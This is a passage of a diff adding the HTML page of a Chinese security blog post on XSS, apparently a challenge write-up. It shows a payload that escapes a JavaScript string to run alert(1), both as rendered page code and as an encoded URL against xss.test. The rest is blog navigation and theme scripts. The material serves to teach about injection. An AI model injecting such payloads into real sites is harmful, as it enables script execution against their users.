+<li>网页代码</li>
+</ul>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;\\&quot;</span>);<span class="hljs-title function_">alert</span>(<span class="hljs-number">1</span>)<span class="hljs-comment">//&quot;);</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>URL</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://xss.test/?input=%5C%22)%3Balert(1)%2F%2F<br></code></pre></td></tr></table></figure>
+
+
+
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/Security/" class="category-chain-item">Security</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/Security/audit/" class="category-chain-item">audit</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/Security/audit/XSS/" class="category-chain-item">XSS</a>
+  
+  
+
+  
+
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Security/">#Security</a>
+      
+        <a href="/tags/audit/">#audit</a>
+      
+        <a href="/tags/XSS/">#XSS</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>耗子XSS</div>
+      <div>https://imiloo.github.io/2022/08/11/2022-08-11.耗子XSS/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>miloo</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2022年8月11日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2022/08/24/2022-08-24.%E8%B6%8A%E6%9D%83_cookie_session/" title="越权、cookie和session">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">越权、cookie和session</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/08/04/2022-08-04.%E7%BB%8F%E5%85%B8%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5/" title="经典漏洞-SQL注入">
+                        <span class="hidden-mobile">经典漏洞-SQL注入</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#comments', function() {
+      var light = 'github-light';
+      var dark = 'github-dark';
+      var schema = document.documentElement.getAttribute('data-user-color-scheme');
+      if (schema === 'dark') {
+        schema = dark;
+      } else {
+        schema = light;
+      }
+      window.UtterancesThemeLight = light;
+      window.UtterancesThemeDark = dark;
+      var s = document.createElement('script');
+      s.setAttribute('src', 'https://utteranc.es/client.js');
+      s.setAttribute('repo', 'imiloo/imiloo.github.io');
+      s.setAttribute('issue-term', 'title');
+      
+      s.setAttribute('label', 'utterances');
+      
+      s.setAttribute('theme', schema);
+      s.setAttribute('crossorigin', 'anonymous');
+      document.getElementById('comments').appendChild(s);
+    })
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <div> <span id="timeDate">载入天数...</span> <span id="times">载入时分秒...</span> <script src="/js/duration.js"></script> </div> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
